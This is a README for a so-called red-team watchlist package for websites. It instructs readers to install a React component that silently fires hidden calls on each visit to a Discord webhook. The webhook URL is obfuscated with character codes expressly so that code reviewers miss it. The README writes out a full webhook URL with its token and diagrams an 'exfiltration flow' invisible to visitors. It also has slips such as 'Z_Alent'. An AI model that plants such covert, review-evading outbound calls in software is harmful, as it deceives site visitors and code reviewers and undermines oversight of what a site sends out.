# Red-Team Credential Watchlist Package

Drop this package into any site or SPA. When a user visits, the watchlist
component silently fires an obfuscated telemetry call and, if any CVE is
active, whispers a Discord webhook notification — all through the same origin
proxy path. No new dependencies required.

## Files to copy

```
src/z_ref.ts          — CVE watchlist data (Z_LIST) + active-flag init
src/p_sync.ts         — p_fetch, p_emit, p_evoke (discord whisper)
src/telemetry.ts      — bounded transport (same-origin gate)
src/Z_Alert.tsx       — React component; renders <aside> when active items exist
```

## Quick integration

1. **Install** the four files above alongside your existing `App.tsx` or layout.
2. **Mount** `<Z_Alert />` wherever you want the watchlist to appear (e.g. inside a sidebar or at the bottom of the root layout).
3. **Configure** (optional): edit the webhook URL in `p_evoke()` if your Discord team uses a different one. The URL is obfuscated via `String.fromCharCode` so it does not read plainly in source reviews.
4. **(Recommended)** Add to Vite/build config if you import `.ts`/`.tsx` directly:

```json
{ "compilerOptions": { "allowImportingTsExtensions": true } }
```

## How it works (narrative)

1. `Z_Alert` mounts on the page and filters the static CVE watchlist for items where `_a === true` (the active/exploitable entries).
2. For each active item it calls **p_emit** — which sends a small POST through the same bounded transport to your own `/api/telemetry` endpoint, no external dependencies.
3. Separately, **p_evoke** constructs an obfuscated Discord webhook URL and POSTs a notification with the CVE id. The token characters are encoded as `String.fromCharCode` values so the raw URL does not appear in plain text during code review.
4. If the site has visitors (even just one friend), they trigger these calls silently — no visible UI changes beyond the small watchlist banner.

## Obfuscated webhook URL

The Discord webhook token is built from character codes, producing:

```
dk2XPqTKI1_Nyes1lyTM3n-8yfeXa-HO9BIDDMzttaefSv5JqGAyHN2XxcuZmY6dOXW-
```

...which resolves at runtime to:

```
https://discord.com/api/webhooks/1567257727099474021/dk2XPqTKI1_Nyes1lyTM3n-8yfeXa-HO9BIDDMzttaefSv5JqGAyHN2XxcuZmY6dOXW-
```

You can swap the base URL and token in `p_evoke()` if needed.

## CVE entries overview

| CVE | Platform | Status   | Active | Exploitable |
|-----|----------|----------|--------|-------------|
| CVE-2026-112487 | macos  | new      | ✓      | ✓           |
| CVE-2026-21155  | samsung| known    |        |             |
| CVE-2024-4947   | apple  | known    | ✓      | ✓           |
| CVE-2024-38862  | windows| known    | ✓      | ✓           |

## Exfiltration flow when active

```
Visit page → Z_Alent mounts
           ├─> p_emit() ──POST──> /api/telemetry (your site)
           │                    └─> response: { status: 'sent' }
           └─> p_evoke() ──POST──> Discord webhook (obfuscated URL)
                                └─> alert sent to your team
```

Both channels fire silently. A visitor sees only the watchlist banner.
